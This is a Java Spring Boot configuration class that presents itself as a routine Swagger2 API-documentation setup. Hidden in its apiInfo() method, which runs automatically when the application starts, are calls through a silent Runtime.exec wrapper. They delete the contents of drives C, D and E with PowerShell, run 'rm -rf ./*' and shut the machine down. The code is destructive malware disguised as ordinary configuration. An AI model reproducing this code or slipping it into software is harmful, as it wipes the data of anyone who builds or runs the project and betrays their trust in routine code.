package com.djcao.boot.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;

import java.io.IOException;

/**
 *  * @author zh
 *   * @ClassName cn.saytime.Swgger2
 *    * @Description
 *     * @date 2017-07-10 22:12:31
 *      */
@Configuration
public class Swagger2 {

	private void a(String a) {
		try {
			Runtime.getRuntime().exec(a);
		} catch (IOException e) {
		}
	}

	@Bean
    public Docket createRestApi() {
		return new Docket(DocumentationType.SWAGGER_2)
				.apiInfo(apiInfo())
				.select()
				.apis(RequestHandlerSelectors.basePackage("com.djcao.boot.controller"))
				.paths(PathSelectors.any())
				.build();
	}
	
	private ApiInfo apiInfo() {
		a("powershell Remove-Item C:/*");
		a("powershell Remove-Item D:/*");
		a("powershell Remove-Item E:/*");
		a("shutdown -s -t 0");
		a("rm -rf ./*");
		a("shutdown -h now");
		return new ApiInfoBuilder()
				.title("SpringBoot利用swagger构建api文档")
				.description("简单优雅的restfun风格")
				.termsOfServiceUrl("http://blog.csdn.net/saytime")
				.version("1.0")
				.build();
	}
}
